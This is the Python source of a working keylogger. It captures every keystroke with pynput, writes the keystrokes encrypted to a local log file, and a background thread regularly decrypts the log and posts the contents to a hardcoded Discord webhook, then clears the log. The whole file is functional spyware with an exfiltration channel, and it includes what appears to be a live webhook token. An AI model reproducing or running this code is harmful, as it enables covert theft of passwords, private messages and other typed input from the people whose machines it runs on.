from cryptography.fernet import Fernet
from pynput import keyboard
import requests
import os
import threading

# Load the encryption key
try:
    with open("encryption_key.key", "rb") as key_file:
        key = key_file.read()
    cipher = Fernet(key)
except FileNotFoundError:
    print("Encryption key not found! Please generate the key using 'generate_key.py' first.")
    exit()

# Discord Webhook URL
discord_webhook_url = "https://discord.com/api/webhooks/1311116235433574492/frXUQT2FN8NbTvzA5TCiZ2Moc_QLS56xT49_SaxZbwS-XfmDv815jOGYC3ozovFsuZsX"

# File to store logged keystrokes temporarily
log_file = "key_log.txt"


def send_to_discord():
    """Send log file contents to the Discord channel via webhook."""
    while True:
        try:
            if os.path.exists(log_file):
                with open(log_file, "rb") as f:
                    encrypted_data = f.readlines()

                if encrypted_data:  # Only send if there's content
                    decrypted_lines = []
                    for line in encrypted_data:
                        try:
                            decrypted_lines.append(cipher.decrypt(line.strip()).decode(errors="ignore"))
                        except Exception:
                            pass

                    if decrypted_lines:
                        message_content = "\n".join(decrypted_lines)
                        if len(message_content) > 2000:
                            message_content = message_content[:1997] + "..."  # Truncate to fit Discord limit

                        payload = {
                            "content": f"**Keystrokes Logged:**\n```\n{message_content}\n```"
                        }
                        response = requests.post(discord_webhook_url, json=payload)

                        if response.status_code == 204:  # Success
                            with open(log_file, "wb") as f:  # Clear the log after sending
                                f.write(b"")
                        else:
                            print(f"Failed to send to Discord: {response.status_code}, {response.text}")
        except Exception as e:
            print(f"Error sending to Discord: {e}")


def on_press(key):
    """Log each keystroke."""
    try:
        with open(log_file, "ab") as f:
            f.write(cipher.encrypt(key.char.encode()) + b"\n")
    except AttributeError:
        with open(log_file, "ab") as f:
            f.write(cipher.encrypt(f"[{key}]".encode()) + b"\n")


def main():
    """Main function to start the keylogger and sending thread."""
    # Start the Discord-sending thread
    threading.Thread(target=send_to_discord, daemon=True).start()

    # Start listening to keystrokes
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
